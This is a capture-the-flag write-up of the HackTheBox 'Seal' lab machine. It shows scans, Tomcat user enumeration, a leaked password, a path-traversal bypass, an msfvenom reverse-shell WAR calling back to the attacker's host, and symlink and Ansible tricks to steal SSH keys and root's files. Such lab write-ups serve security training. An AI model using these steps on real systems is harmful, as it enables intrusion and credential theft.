---
layout: post
title:  "HackTheBox: Seal" 
description: Write up and complete walkthrough of HackTheBox's Seal
---

### NMap scan:

```bash
sudo nmap -sC -sV -oA nmap/seal -O 10.10.10.250
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-21 22:36 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Ping Scan Timing: About 100.00% done; ETC: 22:36 (0:00:00 remaining)
Nmap scan report for 10.10.10.250
Host is up (0.086s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Seal Market
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-05-05T10:24:03
|_Not valid after:  2022-05-05T10:24:03
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Thu, 22 Jul 2021 02:37:06 GMT
|     Set-Cookie: JSESSIONID=node01gxifuvjaxgtellihwt0ekfpv2.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Thu, 22 Jul 2021 02:37:05 GMT
|     Set-Cookie: JSESSIONID=node0t2r4lvch60dcspddrkhrfhau0.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 22 Jul 2021 02:37:05 GMT
|     Set-Cookie: JSESSIONID=node0omt1j7xi3cu34qax42nz19lx1.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4: 
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5: 
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.91%I=7%D=7/21%Time=60F8D9D2%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,F3,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Thu,\x2022\x2
SF:0Jul\x202021\x2002:37:05\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node0t2r4l
SF:vch60dcspddrkhrfhau0\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,
SF:\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html;
SF:charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,107,"HTTP
SF:/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2022\x20Jul\x202021\x2002:37:05\x2
SF:0GMT\r\nSet-Cookie:\x20JSESSIONID=node0omt1j7xi3cu34qax42nz19lx1\.node0
SF:;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000
SF::00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nAllow:\x20
SF:GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,A
SF:D,"HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x20text/html
SF:;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\
SF:n\r\n<h1>Bad\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Version</
SF:pre>")%r(FourOhFourRequest,F4,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate
SF::\x20Thu,\x2022\x20Jul\x202021\x2002:37:06\x20GMT\r\nSet-Cookie:\x20JSE
SF:SSIONID=node01gxifuvjaxgtellihwt0ekfpv2\.node0;\x20Path=/;\x20HttpOnly\
SF:r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-
SF:Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(So
SF:cks5,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x5\r\nConten
SF:t-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nCon
SF:nection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20
SF:Illegal\x20character\x20CNTL=0x5</pre>")%r(Socks4,C3,"HTTP/1\.1\x20400\
SF:x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/html;chars
SF:et=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<
SF:h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CN
SF:TL=0x4</pre>")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illegal\x20character\
SF:x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nConte
SF:nt-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x204
SF:00</h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x80</pre>");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/21%OT=22%CT=1%CU=34444%PV=Y%DS=2%DC=I%G=Y%TM=60F8D9E
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=F5%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.05 seconds
```

- Open ports:
	- 443
	- 8080
	- 22


### Port 443:
- Written Seal Pvt Ltd. on the footer.
- Email also written in the footer: admin@seal.htb
- Images are stored in /images/
- Navigating to /images gives us an error:
![Untitled](/assets/20210721224709.png)
This exposes the Apache Tomcat backend

### Port 8080: Apache Tomcat

- Version 9.0.31
- Username enumeration gives us:

```bash
msf6 auxiliary(scanner/http/tomcat_enum) > set RHOSTS 10.10.10.250
RHOSTS => 10.10.10.250
msf6 auxiliary(scanner/http/tomcat_enum) > run

[*] http://10.10.10.250:8080/admin/j_security_check - Checking j_security_check...
[*] http://10.10.10.250:8080/admin/j_security_check - Server returned: 302
[*] http://10.10.10.250:8080/admin/j_security_check - Apache Tomcat - Trying name: 'admin'
[+] http://10.10.10.250:8080/admin/j_security_check - Apache Tomcat admin found
[*] http://10.10.10.250:8080/admin/j_security_check - Apache Tomcat - Trying name: 'manager'
[+] http://10.10.10.250:8080/admin/j_security_check - Apache Tomcat manager found
[*] http://10.10.10.250:8080/admin/j_security_check - Apache Tomcat - Trying name: 'role1'
[+] http://10.10.10.250:8080/admin/j_security_check - Apache Tomcat role1 found
[*] http://10.10.10.250:8080/admin/j_security_check - Apache Tomcat - Trying name: 'root'
[+] http://10.10.10.250:8080/admin/j_security_check - Apache Tomcat root found
[*] http://10.10.10.250:8080/admin/j_security_check - Apache Tomcat - Trying name: 'tomcat'
[+] http://10.10.10.250:8080/admin/j_security_check - Apache Tomcat tomcat found
[*] http://10.10.10.250:8080/admin/j_security_check - Apache Tomcat - Trying name: 'both'
[+] http://10.10.10.250:8080/admin/j_security_check - Apache Tomcat both found
[+] http://10.10.10.250:8080/admin/j_security_check - Users found: admin, both, manager, role1, root, tomcat
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

- We have a user named Alex at alex@seal.htb
- We have a user named Luis at luis@seal.htb
- 


### GitBucket

Checking through the issues, we see that there has been some discussion about the authentication.

Looking through the commit history, we see this:

![Untitled](/assets/20210722212040.png)

Username: `tomcat`
Password: `42MrHBf*z8{Z%`


We can then access the `/manager/status` of tomcat.

if we take a look at this:
`https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/`

We'll see that there is a vector that opens up for directory traversal, when using tomcat with nginx.

Sure enough, we're in, after setting the url to `/manager/status/..;/html`

![Untitled](/assets/20210722212531.png)

Standard procedure for Tomcat is to generate a bad WAR file and upload it, which would give us a reverse shell.

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.13 LPORT=9001 -f war > reverse.war
Payload size: 1092 bytes
Final size of war file: 1092 bytes
```

When uploading the WAR, we must intercept the POST request and add the additional path traversal to the outgoing request's URL. Otherwise, we will only get a 403 again.

![Untitled](/assets/20210722213756.png)

Once uploaded, startup a listener on the port given during the generation of the WAR file, and proceed to launch the webpage generated in the tomcat manager ui.

If done correctly, this will spawn the reverse shell.

![Untitled](/assets/20210722214056.png)

`python3 --version` gives us confirmation that python is available on the box.

`python3 -c "import pty; pty.spawn('bin/bash')"` gives us a better shell.

Finally to get the best tty: 
```
$ stty raw -echo && fg
$ reset
$ xterm
$ export TERM=xterm && export SHELL=/bin/bash
```

```
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ln -s /home/luis/.ssh/ $PWD
```

This will link the `.ssh/` folder of the `luis` user to the `uploads/` folder. Since the `run.yml` tasks file of the `ansible-playbook` command will copy and synchronize all of the files in the `/opt/backups/archives` folder and the `/var/lib/tomcat9/webapps/ROOT/admin/dashboard/` folder, the `.ssh` folder will also be copied. This will allow us to then download the `.ssh/` folder and get user access: 

luis@seal:~$ cat user.txt
7e5ea8501d48fb6af9ab1f91be7dbc96



![Untitled](/assets/20210722232631.png)

```yml
- hosts: localhost
  become: yes
  become_user: root
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    become: true
    archive:
      path: "/root/"
      dest: "/home/luis/root.tar.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

```bash
luis@seal:~$ sudo ansible-playbook /opt/backups/playbook/run.yml 
[WARNING]: provided hosts list is empty, only localhost is available. Note that the
implicit localhost does not match 'all'

PLAY [localhost] *******************************************************************

TASK [Gathering Facts] *************************************************************
ok: [localhost]

TASK [Copy Files] ******************************************************************
changed: [localhost]

TASK [Server Backups] **************************************************************
changed: [localhost]

TASK [Clean] ***********************************************************************
changed: [localhost]

PLAY RECAP *************************************************************************
localhost                  : ok=4    changed=3    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   

luis@seal:~$ ls
gitbucket.war  root.tar.gz  user.txt
```

![Untitled](/assets/20210722235051.png)